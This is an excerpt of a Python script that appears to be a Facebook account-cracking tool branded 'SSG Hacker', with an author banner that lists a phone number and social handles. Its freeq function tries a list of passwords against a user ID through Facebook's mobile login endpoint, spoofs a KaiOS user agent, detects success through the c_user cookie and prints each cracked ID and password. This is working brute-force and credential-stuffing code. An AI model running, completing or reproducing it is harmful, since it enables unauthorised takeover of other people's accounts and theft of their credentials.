...
Y88b.           Y88b.           888    888 
 "Y888b.         "Y888b.        888        
    "Y88b.          "Y88b.      888  88888 
      "888            "888      888    888 P
Y88b  d88P      Y88b  d88P      Y88b  d88P R
 \033[96;1m"Y8888P"        "Y8888P"        "Y8888P88 O
                                           
𝙉𝘼𝘼𝙈 𝙃𝙀 𝙆𝘼𝙁𝙄 𝙃𝘼𝙄
 __________________×______________________
       💜👿SSG 𝙃𝙖𝙘𝙠𝙚𝙧👿💜
\033[1;97m       
\033[1;97m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;37m➟  \033[93;1mYASIR_X_MARWAN_X_ইয়াসির
\033[1;97m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;37m➟   \033[93;1mMarwan AfriDi
\033[1;97mWHATSAPP  \033[1;37m ➟   \033[93;1m{  +923189141630   ]
\033[1;97m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;37m ➟   \033[93;1mMARWAN-TECH404
\033[1;97m𝐕𝐄𝐑𝐒𝐈𝐎𝐍    \033[1;37m➟   \033[1;32m20.1       
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('m.facebook.com').text
            log_data = {
            ...
            "email":uid,
            "next":"m.facebook.com/login/device-based/regular/login/?refsrc",
            "flow":"login_no_pain",
            "pass":ps,
            "login":"Log In"}
            headers = {
    ...
    # 'cookie': 'datr=b3QLZLQ8j91_-iY9kKJvLPns; sb=b3QLZAUqyw5OwkrayvjkgfAX; m_pixel_ratio=2; wd=360x639; fr=03DIAqWL2NSk56gO0..BkC3Rv._9.AAA.0.0.BkC3R4.AWVC8Xa5XXA',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            lo = session.post('m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;32m[SSG-OK]\033[1;92m\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\x1b[38;5;208m[SSG-CP]\033[1;97m]\x1b[38;5;208m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Runing] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
